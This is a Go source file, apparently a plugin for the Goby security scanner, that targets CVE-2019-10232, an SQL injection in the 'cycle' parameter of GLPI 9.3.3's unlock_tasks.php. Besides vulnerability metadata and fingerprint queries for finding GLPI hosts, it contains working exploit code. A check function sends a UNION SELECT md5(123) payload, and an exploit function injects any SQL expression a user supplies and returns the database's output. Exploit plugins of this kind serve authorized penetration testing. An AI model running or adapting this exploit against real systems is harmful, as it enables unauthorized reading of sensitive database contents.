package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GLPI 9.3.3 sqli (CVE-2019-10232)",
    "Description": "<p>Teclib GLPI is a set of IT asset management solutions.</p><p>There are SQL injection vulnerabilities in Teclib GLPI 9.3.3 and earlier versions. A remote attacker can use the ‘cycle’ parameter of the unlock_tasks.php file to use this vulnerability to execute arbitrary SQL commands and obtain sensitive database information.</p>",
    "Impact": "GLPI 9.3.3 sqli (CVE-2019-10232)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c\">https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "GLPI",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "GLPI 资产管理系统 9.3.3版本 SQL 注入漏洞（CVE-2019-10232）",
            "Description": "<p>Teclib GLPI是一套IT资产管理解决方案。</p><p>Teclib GLPI 9.3.3及之前版本中存在SQL注入漏洞。远程攻击者可借助unlock_tasks.php文件的‘cycle’参数利用该漏洞执行任意的SQL命令，获取数据库敏感信息。</p>",
            "Impact": "<p>Teclib GLPI 9.3.3及之前版本中存在SQL注入漏洞。远程攻击者可借助/scripts/unlock_tasks.php文件的‘cycle’参数利用该漏洞执行任意的SQL命令。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c\">https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "GLPI",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "GLPI 9.3.3 sqli (CVE-2019-10232)",
            "Description": "<p>Teclib GLPI is a set of IT asset management solutions.</p><p>There are SQL injection vulnerabilities in Teclib GLPI 9.3.3 and earlier versions. A remote attacker can use the ‘cycle’ parameter of the unlock_tasks.php file to use this vulnerability to execute arbitrary SQL commands and obtain sensitive database information.</p>",
            "Impact": "GLPI 9.3.3 sqli (CVE-2019-10232)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c\">https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "GLPI",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(body=\"href=\\\"/pics/favicon.ico\\\"\" && body=\"autofocus=\\\"autofocus\\\"\" && title=\"GLPI - 登陆入口\") || title=\"GLPI\"",
    "GobyQuery": "(body=\"href=\\\"/pics/favicon.ico\\\"\" && body=\"autofocus=\\\"autofocus\\\"\" && title=\"GLPI - 登陆入口\") || title=\"GLPI\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://glpi-project.org",
    "DisclosureDate": "2019-11-01",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2019-10232"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-10232"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201903-1080"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "GLPI"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10237"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,md5(123)--%20&only_tasks=1"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b70") {
					return true
				}
			}
			uri1 := "/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,md5(123)--%20&only_tasks=1"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "202cb962ac59075b964b07152d234b70") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			uri := "/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201," + url.QueryEscape(cmd) + "--%20&only_tasks=1"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			uri1 := "/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201," + url.QueryEscape(cmd) + "--%20&only_tasks=1"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					expResult.Output = resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
